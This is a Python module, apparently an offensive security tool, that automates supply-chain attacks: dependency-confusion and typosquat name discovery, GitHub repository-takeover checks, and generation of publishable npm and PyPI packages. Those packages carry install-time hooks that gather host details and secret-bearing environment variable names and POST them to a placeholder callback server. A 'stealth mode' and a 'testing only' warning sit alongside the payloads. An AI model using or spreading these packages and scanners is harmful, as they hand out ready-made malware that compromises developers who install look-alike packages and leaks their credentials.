"""
Supply Chain Attack Modules
Dependency Confusion, Typosquatting, and Repository Takeover automation
"""
import asyncio
import aiohttp
import json
import re
import random
import string
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import hashlib

class SupplyChainAttacker:
    """Automated supply chain attack testing and simulation"""
    
    def __init__(self, target_org: Optional[str] = None, stealth_mode: bool = False):
        self.target_org = target_org
        self.stealth_mode = stealth_mode
        self.findings: List[Dict] = []
        
        self.registries = {
            "npm": {
                "url": "https://registry.npmjs.org",
                "check_url": "https://registry.npmjs.org/{package}",
                "ecosystem": "JavaScript/Node.js"
            },
            "pypi": {
                "url": "https://pypi.org/pypi",
                "check_url": "https://pypi.org/pypi/{package}/json",
                "ecosystem": "Python"
            },
            "rubygems": {
                "url": "https://rubygems.org",
                "check_url": "https://rubygems.org/api/v1/gems/{package}.json",
                "ecosystem": "Ruby"
            },
            "nuget": {
                "url": "https://api.nuget.org",
                "check_url": "https://api.nuget.org/v3/registration5-semver1/{package}/index.json",
                "ecosystem": ".NET"
            }
        }
        
        self.typosquat_techniques = {
            "missing_char": lambda s: [s[:i] + s[i+1:] for i in range(len(s))],
            "double_char": lambda s: [s[:i] + s[i] + s[i:] for i in range(len(s))],
            "swap_chars": lambda s: [s[:i] + s[i+1] + s[i] + s[i+2:] for i in range(len(s)-1)],
            "wrong_char": lambda s: [s[:i] + c + s[i+1:] for i in range(len(s)) for c in 'abcdefghijklmnopqrstuvwxyz0123456789-_' if c != s[i]],
            "homoglyph": lambda s: self._generate_homoglyphs(s),
            "add_prefix": lambda s: [f"{prefix}{s}" for prefix in ['dev-', 'test-', 'internal-', 'corp-', 'private-']],
            "add_suffix": lambda s: [f"{s}{suffix}" for suffix in ['-dev', '-test', '-internal', '-beta', '-alpha', '-latest']]
        }
        
        self.homoglyph_map = {
            'a': ['а', 'ä', 'à', 'á', 'â', '@'],
            'e': ['е', 'ë', 'è', 'é', 'ê', '3'],
            'i': ['і', 'ï', 'ì', 'í', 'î', '1', 'l'],
            'o': ['о', 'ö', 'ò', 'ó', 'ô', '0'],
            'u': ['ù', 'ú', 'û', 'ü'],
            'c': ['с', 'ç'],
            's': ['ѕ', '$', '5'],
            'l': ['1', 'i', '|'],
            'n': ['п'],
            'r': ['г'],
            'y': ['у', 'ý'],
            '0': ['o', 'О'],
            '1': ['l', 'i', '|']
        }
    
    def _generate_homoglyphs(self, package_name: str) -> List[str]:
        """Generate homoglyph variations of package name"""
        variations = []
        
        for i, char in enumerate(package_name):
            if char.lower() in self.homoglyph_map:
                for replacement in self.homoglyph_map[char.lower()]:
                    new_name = package_name[:i] + replacement + package_name[i+1:]
                    variations.append(new_name)
        
        return variations[:20]
    
    async def check_dependency_confusion(self, internal_packages: List[str], registry: str = "npm") -> List[Dict]:
        """Check for dependency confusion vulnerabilities"""
        vulnerable = []
        
        if registry not in self.registries:
            return vulnerable
        
        reg_info = self.registries[registry]
        
        async with aiohttp.ClientSession() as session:
            for package in internal_packages:
                check_url = reg_info["check_url"].format(package=package.lower())
                
                try:
                    async with session.get(check_url, timeout=10) as response:
                        if response.status == 404:
                            vulnerable.append({
                                "type": "Dependency Confusion",
                                "package": package,
                                "registry": registry,
                                "status": "available",
                                "severity": "Critical",
                                "description": f"Internal package '{package}' is not claimed on {registry}. An attacker could register this name."
                            })
                            self.findings.append(vulnerable[-1])
                        elif response.status == 200:
                            data = await response.json()
                            owner = self._extract_owner(data, registry)
                            
                            if self.target_org and owner and self.target_org.lower() not in owner.lower():
                                vulnerable.append({
                                    "type": "Potential Dependency Confusion",
                                    "package": package,
                                    "registry": registry,
                                    "owner": owner,
                                    "status": "external_owner",
                                    "severity": "High",
                                    "description": f"Package '{package}' exists but is owned by '{owner}', not your organization."
                                })
                                self.findings.append(vulnerable[-1])
                except Exception as e:
                    pass
                
                if self.stealth_mode:
                    await asyncio.sleep(0.5)
        
        return vulnerable
    
    def _extract_owner(self, data: Dict, registry: str) -> Optional[str]:
        """Extract package owner from registry response"""
        if registry == "npm":
            return data.get("maintainers", [{}])[0].get("name", "")
        elif registry == "pypi":
            return data.get("info", {}).get("author", "")
        elif registry == "rubygems":
            return data.get("authors", "")
        return None
    
    async def generate_typosquats(self, target_package: str, registry: str = "npm") -> List[Dict]:
        """Generate typosquatting candidates and check availability"""
        candidates = []
        
        all_variations = set()
        for technique_name, technique_func in self.typosquat_techniques.items():
            try:
                variations = technique_func(target_package)
                for var in variations:
                    if var and var != target_package and len(var) > 1:
                        all_variations.add((var, technique_name))
            except:
                pass
        
        if registry in self.registries:
            reg_info = self.registries[registry]
            
            async with aiohttp.ClientSession() as session:
                for var, technique in list(all_variations)[:50]:
                    check_url = reg_info["check_url"].format(package=var.lower())
                    
                    try:
                        async with session.get(check_url, timeout=5) as response:
                            if response.status == 404:
                                candidates.append({
                                    "type": "Typosquat Candidate",
                                    "original": target_package,
                                    "typosquat": var,
                                    "technique": technique,
                                    "registry": registry,
                                    "available": True,
                                    "severity": "Medium"
                                })
                            elif response.status == 200:
                                data = await response.json()
                                downloads = self._get_download_count(data, registry)
                                
                                if downloads and downloads < 100:
                                    candidates.append({
                                        "type": "Suspicious Existing Package",
                                        "original": target_package,
                                        "typosquat": var,
                                        "technique": technique,
                                        "downloads": downloads,
                                        "severity": "High",
                                        "description": "Low download count might indicate malicious squatting"
                                    })
                    except:
                        pass
                    
                    if self.stealth_mode:
                        await asyncio.sleep(0.3)
        
        self.findings.extend(candidates)
        return candidates
    
    def _get_download_count(self, data: Dict, registry: str) -> Optional[int]:
        """Extract download count from registry data"""
        try:
            if registry == "npm":
                return data.get("downloads", 0)
            elif registry == "pypi":
                return data.get("info", {}).get("downloads", {}).get("last_week", 0)
            elif registry == "rubygems":
                return data.get("downloads", 0)
        except:
            pass
        return None
    
    async def check_repo_takeover(self, github_repos: List[str]) -> List[Dict]:
        """Check for repository takeover opportunities"""
        vulnerable = []
        
        async with aiohttp.ClientSession() as session:
            for repo in github_repos:
                parts = repo.split("/")
                if len(parts) != 2:
                    continue
                
                owner, repo_name = parts
                
                user_url = f"https://api.github.com/users/{owner}"
                try:
                    async with session.get(user_url, timeout=10) as response:
                        if response.status == 404:
                            vulnerable.append({
                                "type": "GitHub User Takeover",
                                "repository": repo,
                                "owner": owner,
                                "status": "user_not_found",
                                "severity": "Critical",
                                "description": f"GitHub user '{owner}' does not exist. Repo takeover possible by registering this username."
                            })
                            self.findings.append(vulnerable[-1])
                            continue
                except:
                    pass
                
                repo_url = f"https://api.github.com/repos/{owner}/{repo_name}"
                try:
                    async with session.get(repo_url, timeout=10) as response:
                        if response.status == 404:
                            vulnerable.append({
                                "type": "GitHub Repo Available",
                                "repository": repo,
                                "status": "repo_not_found",
                                "severity": "High",
                                "description": f"Repository '{repo}' does not exist. Could be recreated by the user."
                            })
                            self.findings.append(vulnerable[-1])
                except:
                    pass
                
                pages_url = f"https://{owner}.github.io/{repo_name}/"
                try:
                    async with session.get(pages_url, timeout=10) as response:
                        if response.status == 404:
                            cname_url = f"https://raw.githubusercontent.com/{owner}/{repo_name}/main/CNAME"
                            async with session.get(cname_url, timeout=5) as cname_resp:
                                if cname_resp.status == 200:
                                    cname = await cname_resp.text()
                                    vulnerable.append({
                                        "type": "GitHub Pages Takeover",
                                        "repository": repo,
                                        "cname": cname.strip(),
                                        "severity": "Critical",
                                        "description": f"GitHub Pages has dangling CNAME pointing to non-existent repo"
                                    })
                                    self.findings.append(vulnerable[-1])
                except:
                    pass
                
                if self.stealth_mode:
                    await asyncio.sleep(1)
        
        return vulnerable
    
    def generate_malicious_package(self, package_name: str, registry: str = "npm") -> Dict:
        """Generate template for malicious package (for testing purposes)"""
        if registry == "npm":
            return {
                "package_name": package_name,
                "registry": "npm",
                "files": {
                    "package.json": json.dumps({
                        "name": package_name,
                        "version": "99.0.0",
                        "description": "Internal package",
                        "main": "index.js",
                        "scripts": {
                            "preinstall": "node preinstall.js",
                            "postinstall": "node index.js"
                        }
                    }, indent=2),
                    "index.js": """
// Exfiltration script for testing
const https = require('https');
const os = require('os');

const data = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform(),
    cwd: process.cwd(),
    env: Object.keys(process.env).filter(k => 
        k.includes('TOKEN') || k.includes('KEY') || k.includes('SECRET')
    )
};

// For testing - send to your callback server
const postData = JSON.stringify(data);
const options = {
    hostname: 'YOUR_CALLBACK_SERVER',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {'Content-Type': 'application/json'}
};

try {
    const req = https.request(options, (res) => {});
    req.write(postData);
    req.end();
} catch(e) {}
""",
                    "preinstall.js": """
// Pre-install hook
console.log('[*] Package installing...');
"""
                },
                "publish_command": f"npm publish",
                "warning": "FOR SECURITY TESTING ONLY - Do not use for malicious purposes"
            }
        
        elif registry == "pypi":
            return {
                "package_name": package_name,
                "registry": "pypi",
                "files": {
                    "setup.py": f"""
from setuptools import setup
from setuptools.command.install import install
import os
import socket
import json
import urllib.request

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        # Exfiltration for testing
        data = {{
            'hostname': socket.gethostname(),
            'user': os.getenv('USER', 'unknown'),
            'cwd': os.getcwd(),
            'env_keys': [k for k in os.environ.keys() if 'TOKEN' in k or 'KEY' in k or 'SECRET' in k]
        }}
        try:
            req = urllib.request.Request(
                'https://YOUR_CALLBACK_SERVER/collect',
                data=json.dumps(data).encode(),
                headers={{'Content-Type': 'application/json'}}
            )
            urllib.request.urlopen(req, timeout=5)
        except: pass

setup(
    name='{package_name}',
    version='99.0.0',
    description='Internal package',
    cmdclass={{'install': PostInstallCommand}},
    packages=[]
)
""",
                    "README.md": "Internal package"
                },
                "publish_command": f"python setup.py sdist upload",
                "warning": "FOR SECURITY TESTING ONLY"
            }
        
        return {"error": f"Unsupported registry: {registry}"}
    
    async def scan_package_manifest(self, manifest_content: str, manifest_type: str = "package.json") -> List[Dict]:
        """Scan package manifest for supply chain risks"""
        risks = []
        
        try:
            if manifest_type == "package.json":
                data = json.loads(manifest_content)
                dependencies = {
                    **data.get("dependencies", {}),
                    **data.get("devDependencies", {})
                }
                
                for pkg, version in dependencies.items():
                    if version.startswith("git"):
                        risks.append({
                            "type": "Git Dependency",
                            "package": pkg,
                            "version": version,
                            "severity": "Medium",
                            "description": "Git dependencies can be hijacked via repo takeover"
                        })
                    
                    if version.startswith("file:") or version.startswith("link:"):
                        risks.append({
                            "type": "Local Dependency",
                            "package": pkg,
                            "version": version,
                            "severity": "High",
                            "description": "Local/internal dependency could be confused"
                        })
                    
                    if "@" in pkg and "/" in pkg:
                        scope = pkg.split("/")[0]
                        if scope.startswith("@") and len(scope) > 1:
                            confusion = await self.check_dependency_confusion([pkg.split("/")[1]], "npm")
                            if confusion:
                                risks.extend(confusion)
                
                scripts = data.get("scripts", {})
                dangerous_scripts = ["preinstall", "postinstall", "prepublish"]
                for script_name in dangerous_scripts:
                    if script_name in scripts:
                        risks.append({
                            "type": "Lifecycle Script",
                            "script": script_name,
                            "command": scripts[script_name],
                            "severity": "Info",
                            "description": f"Package has {script_name} hook that runs during installation"
                        })
        
        except json.JSONDecodeError:
            pass
        
        self.findings.extend(risks)
        return risks
    
    def get_report(self) -> Dict:
        """Generate supply chain attack report"""
        return {
            "target_organization": self.target_org,
            "total_findings": len(self.findings),
            "critical": len([f for f in self.findings if f.get("severity") == "Critical"]),
            "high": len([f for f in self.findings if f.get("severity") == "High"]),
            "findings": self.findings,
            "recommendations": [
                "Register internal package names on public registries",
                "Use scoped packages (@org/package) where possible",
                "Implement package lock files and verify checksums",
                "Monitor for typosquat registrations",
                "Audit dependencies regularly"
            ]
        }
